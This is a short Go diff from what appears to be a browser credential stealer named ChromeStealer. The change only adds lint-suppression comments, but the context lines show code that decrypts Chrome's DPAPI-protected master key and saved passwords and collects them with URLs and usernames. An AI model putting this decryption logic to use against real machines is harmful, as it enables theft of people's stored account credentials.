@@ -70,8 +70,8 @@ func chromeMasterKey(localStatePath string) ([]byte, error) {
 	// The key is encrypted using the windows DPAPI method and signed with it.
 	// It looks like "DPAPI05546sdf879z456...", we remove the prefix DPAPI,
 	// then we decrypt it.
-	masterKey, err := cryptox.WDecrypt([]byte(strings.TrimPrefix(string(dpapiKey), "DPAPI")))
-	if err != nil {
+	masterKey, err := cryptox.WDecrypt([]byte(strings.TrimPrefix(string(dpapiKey), "DPAPI"))) //nolint:staticcheck
+	if err != nil {                                                                           //nolint:staticcheck
 		return []byte{}, err
 	}
 
@@ -133,8 +133,8 @@ func (cs ChromeStealer) Run() (Results, error) {
 			}
 			res.AddCredentials(cred.URL, cred.Username, string(password))
 		default: // chrome version < 80
-			password, err := cryptox.WDecrypt([]byte(cred.Password))
-			if err != nil {
+			password, err := cryptox.WDecrypt([]byte(cred.Password)) //nolint:staticcheck
+			if err != nil {                                          //nolint:staticcheck
 				fmt.Println("ERROR:", err.Error())
 				continue
 			}
